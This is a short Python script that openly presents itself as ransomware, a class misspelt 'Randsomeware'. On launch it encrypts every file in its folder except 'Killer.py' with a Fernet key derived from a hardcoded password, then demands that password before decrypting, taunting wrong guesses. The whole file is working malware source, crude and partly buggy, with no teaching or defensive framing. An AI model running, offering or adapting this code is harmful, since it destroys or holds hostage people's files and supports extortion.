
from cryptography.fernet import Fernet
from os import urandom
import base64
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from os import path,listdir
class Randsomeware():

    def __init__(self) -> None:
        self.password = "GRAAL".encode()
        
        self.salt = urandom(16)
        self.kdf= PBKDF2HMAC(salt=self.salt,algorithm=hashes.SHA256(),length=32, iterations=390000)
        self.key = base64.urlsafe_b64encode(self.kdf.derive(self.password))
        self.f = Fernet(self.key)


    def Encrypt_all_files_in_folder(self) -> None:
        self.cur_dir = path.dirname(path.abspath(__file__))

        for filename in listdir(self.cur_dir):

            self.new_cont =[]
            if filename != "Killer.py":

                with open(path.abspath(filename),"r") as file:
                    
                    content = file.readlines()
                   
                    for line in content:
                        self.new_cont.append(self.f.encrypt(line.encode()).decode()) 
                        

                with open(path.abspath(filename),"w") as file:
                    file.writelines(self.new_cont)

    def Decrypt_all_files_in_folder(self) -> None:
        for filename in listdir(self.cur_dir):

            self.new_cont =[]
            if filename != "Killer.py":

                with open(path.abspath(filename),"r") as file:
                    
                    content = file.readlines()
                    
                    for line in content:
                        
                        self.new_cont.append(self.f.decrypt(line.encode()).decode()) 
                        

                with open(path.abspath(filename),"w+") as file:
                    file.writelines(self.new_cont)
        
  
Randsome = Randsomeware()
Randsome.Encrypt_all_files_in_folder()

while True:
    if str(input("Write the password to dencrypt the files: ")).encode() == Randsome.password:
        Randsome.Decrypt_all_files_in_folder()
        print("Get your brand new decrypted files :) ")
        break
    else:
        print("Wrong pass, have a nice cracked files :) ")

    

